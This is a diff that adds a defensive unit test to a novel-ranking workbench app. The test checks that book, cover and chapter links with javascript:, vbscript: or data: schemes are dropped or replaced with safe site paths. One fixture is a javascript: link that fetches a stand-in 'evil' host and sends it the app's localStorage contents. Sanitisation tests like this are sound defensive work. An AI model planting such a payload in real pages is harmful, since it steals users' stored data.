@@ -616,6 +616,30 @@ test('importRankStore 拒绝坏文件但容忍坏快照', () => {
   equal(docs.length, 1, '坏快照被跳过，好快照照常导入')
 })
 
+test('链接协议白名单：javascript: 不入库，http(s) 与相对路径照常', () => {
+  const items = parseQimaoRankJson({ data: { table_data: [
+    { book_id: '9101', title: '诱饵书', book_url: "javascript:fetch('https://evil/?k='+localStorage.getItem('novel-workbench-next/v1'))", number: '1' },
+    { book_id: '9102', title: '相对路径书', book_url: '/shuku/9102/', number: '2' },
+    { book_id: '9103', title: '正常书', book_url: 'https://www.qimao.com/shuku/9103/', number: '3' },
+  ] } })
+  equal(items[0].bookUrl, 'https://www.qimao.com/shuku/9101/', '危险协议回退到按 ID 兜底的站点路径')
+  equal(items[1].bookUrl, '/shuku/9102/', '站点内相对路径放行')
+  equal(items[2].bookUrl, 'https://www.qimao.com/shuku/9103/', '合法绝对地址放行')
+
+  const docs = importRankStore({
+    format: RANK_FILE_FORMAT,
+    snapshots: [
+      { sourceId: 1, statDate: localDate(), items: [{ rankNo: 1, bookTitle: '存档诱饵', bookUrl: 'vbscript:msgbox(1)' }, { rankNo: 2, bookTitle: '存档正常', bookUrl: 'https://fanqienovel.com/page/1', coverUrl: 'javascript:x', lastChapterUrl: '/chapter/1' }] },
+      { sourceId: 2, statDate: localDate(), items: [{ rankNo: 1, bookTitle: '全坏快照', bookUrl: 'data:text/html,x' }] },
+    ],
+  })
+  equal(docs.length, 1, '整条全坏的快照被跳过')
+  equal(docs[0].items.length, 1, '危险条目被剔除')
+  equal(docs[0].items[0].bookUrl, 'https://fanqienovel.com/page/1')
+  equal(docs[0].items[0].coverUrl, null, '封面图地址同样过白名单')
+  equal(docs[0].items[0].lastChapterUrl, '/chapter/1', '最新章节相对路径放行')
+})
+
 // ---------------------------------------------------------------------------
 // 手动导入
 // ---------------------------------------------------------------------------
